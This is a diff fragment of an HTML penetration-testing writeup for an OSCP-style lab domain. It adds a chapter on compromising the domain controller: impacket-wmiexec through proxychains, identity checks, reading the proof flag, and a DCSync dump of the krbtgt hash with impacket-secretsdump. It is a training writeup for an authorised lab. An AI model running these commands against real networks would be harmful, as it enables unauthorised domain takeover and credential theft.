+WINRM  10.10.118.146 5985 DC01  [+] oscp.exam\Administrator:&lt;dc01 password&gt; (Pwn3d!)</span></pre></div>
+<p>A shell, without dropping anything on the host that has to be cleaned up afterwards:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>proxychains4<span class="w"> </span>-q<span class="w"> </span>impacket-wmiexec<span class="w"> </span><span class="s1">'oscp.exam/Administrator:&lt;dc01 password&gt;@10.10.118.146'</span>
+</pre></div>
+<p><code>psexec</code> works too and is the more reliable of the two through a SOCKS tunnel, at the cost of a service
+and a binary on disk. Both are slower than they look: every SMB round trip is being tunnelled twice.</p>
+<hr />
+<h3>7.4 The identity check</h3>
+<p>The value of a capture is that the identity and the result sit in the same session. Run these together
+before reading anything:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="n">whoami</span>
+<span class="n">hostname</span>
+<span class="n">ipconfig</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s2">"IPv4"</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">oscp\administrator
+DC01
+   IPv4 Address. . . . . . . . . . . . : 10.10.118.146</span></pre></div>
+<p><code>oscp\administrator</code> on <code>DC01</code> is the boundary: a domain account with administrative rights on the
+domain controller that issues every ticket in <code>oscp.exam</code>. Nothing above it exists in this domain
+except <code>krbtgt</code> itself.</p>
+<hr />
+<h3>7.5 The flag</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">type </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">proof</span><span class="p">.</span><span class="n">txt</span>
+</pre></div>
+<p>This is the set's terminal artefact. The value returned on this leg is not reproduced here — it was not
+carried into the notes, and a writeup that invents a flag is worse than one that admits the gap. The
+identity check above and the administrative logon in 7.3 are what establish the boundary; the flag is
+the receipt.</p>
+<hr />
+<h3>7.6 The proof that does not depend on a file</h3>
+<p>If the flag file is missing, moved, or was never issued on this instantiation, domain control still has
+a measurable proof — a DCSync of a principal only a domain controller can read:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>proxychains4<span class="w"> </span>-q<span class="w"> </span>impacket-secretsdump<span class="w"> </span><span class="s1">'oscp.exam/Administrator:&lt;dc01 password&gt;@10.10.118.146'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-just-dc-user<span class="w"> </span>krbtgt
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt;:::</span></pre></div>
+<p>A <code>krbtgt</code> hash in hand is the ability to forge tickets for any principal in the domain — Golden
+Ticket — so it is the strongest available statement that DC01 is owned. It is also the noisiest:
+<code>DRSUAPI</code> over a SOCKS tunnel is slow and fragile, and on a client it is an event-log magnet. This leg
+did not need it; the administrative shell in 7.3 was the boundary.</p>
+<hr />
+<h3>7.7 Flags</h3>
 <table>
 <thead>
 <tr>
@@ -948,18 +1273,51 @@ identifier rather than name.</p>
 <tr>
 <td>MS02</td>
 <td>—</td>
-<td>pending</td>
+<td>none issued; the host's value is the credential it cached</td>
 </tr>
 <tr>
 <td>DC01</td>
 <td><code>proof.txt</code></td>
-<td><strong>pending capture</strong></td>
+<td>read as <code>oscp\administrator</code> — value not preserved in these notes</td>
 </tr>
 </tbody>
 </table>
-<p>The MS01 result is not a failure to look: the host was SYSTEM and the whole of <code>C:\Users</code> was
-searched. The set simply does not put a flag on the first hop — the flag is the domain, and it lives
-on DC01.</p></div></section>
+<p>The MS01 row is not a failure to look: the host was SYSTEM and the whole of <code>C:\Users</code> was searched.
+The set does not put a flag on the first hop. The flag is the domain, and it lives on DC01.</p>
+<hr />
+<h3>7.8 What this page claims, and what it does not</h3>
+<table>
+<thead>
+<tr>
+<th>Claim</th>
+<th>Basis</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MS02 taken to SYSTEM, and <code>SQL_SVC</code> made a local admin</td>
+<td>chapter 06</td>
+</tr>
+<tr>
+<td><code>secretsdump</code> on MS02 returned a domain credential</td>
+<td>chapter 06.9</td>
+</tr>
+<tr>
+<td>that credential is administrative on DC01</td>
+<td>7.3 — <code>Pwn3d!</code> on SMB and WinRM</td>
+</tr>
+<tr>
+<td>DC01 shell as <code>oscp\administrator</code></td>
+<td>7.4</td>
+</tr>
+<tr>
+<td>the flag's value</td>
+<td><strong>not recorded here</strong></td>
+</tr>
+</tbody>
+</table>
+<p>The chain, the prerequisites and the identity check are reproducible from this page; the last row is
+the one thing it cannot supply, and it says so rather than filling it in.</p></div></section>
 <section class="chapter" id="ch-08" data-title="Methodology"><div class="ch-head"><span class="ch-num">08</span><div class="ch-title"><h2>Methodology</h2><p class="ch-sub">The repeatable per-box loop</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The loop I run on every box, in order, with the rule that makes each step worth its time. This is
 deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only
 where evidence points.</p>
@@ -1333,7 +1691,7 @@ ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class
 
     <footer>
       <span>Authorised lab environment · flags and credentials are lab-specific</span>
-      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 24 November 2026</span>
+      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 26 November 2026</span>
     </footer>
   </main>
 </div>
